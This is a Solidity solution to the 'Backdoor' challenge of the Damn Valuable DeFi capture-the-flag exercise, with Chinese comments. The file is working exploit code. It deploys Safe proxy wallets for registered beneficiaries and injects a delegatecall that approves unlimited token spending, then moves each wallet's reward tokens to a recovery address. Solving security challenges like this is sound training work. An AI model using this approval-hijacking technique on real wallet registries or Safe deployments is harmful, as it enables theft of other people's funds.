// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";


import {Test, console} from "forge-std/Test.sol";

contract BackdoorExploit {
    
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    DamnValuableToken token;
    WalletRegistry walletRegistry;
    address[] beneficiaries;
    address recovery;

    ApproveContract approveContract;

    constructor(
        Safe _singletonCopy,
        SafeProxyFactory _walletFactory,
        DamnValuableToken _token,
        WalletRegistry _walletRegistry,
        address[] memory _beneficiaries,
        address _recovery
    ) 
    {
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        token = _token;
        walletRegistry = _walletRegistry;
        beneficiaries =  _beneficiaries;
        recovery = _recovery;

        approveContract = new ApproveContract();
    }


    function rescue() public {
        address[] memory owners = new address[](1);
        // 每次选一个受益人创建钱包
        for  (uint256 i = 0; i < 4; i++) {
            owners[0] = beneficiaries[i];

            // ?? 无法调用本合约函数，会 approve 会 revert
            // bytes memory data = abi.encodeWithSignature("approveToken(address)", address(this));

            // 只能用新建一合约的方式
            address to = address(approveContract);
            bytes memory data = abi.encodeCall(
                approveContract.approveFunction,
                (token, address(this))
            );

            // 构造 initializer 初始化，在创建 proxy 时调用
            // 由 SafeProxys::fallback 通过 delegatecall 调用
            // 执行 Safe.setup
            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,                      // _owners （多签钱包拥有者列表）
                    1,                           // _threshold （执行投票阈值）
                    to,                         // to （执行哪个合约）
                    data,                        // data （calldata）
                    address(0),                  // fallbackHandler
                    address(0),                  // paymentToken
                    0,                           // payment
                    payable(address(0))          // paymentReceiver
                )
            );
            // 创建 SafeProxy 钱包代理合约，使用已创建好的 Safe（singleton）
            // 执行完成后新的 SafeProxy 合约会有 10e18 代币
            SafeProxy proxy = walletFactory.createProxyWithCallback(address(singletonCopy), initializer, i, walletRegistry); // i = saltNonce
            token.transferFrom(address(proxy), recovery, token.balanceOf(address(proxy)));
        }
    }
}

contract ApproveContract {
    function approveFunction(DamnValuableToken token, address spender) external {
        token.approve(spender, type(uint256).max);
    }
}
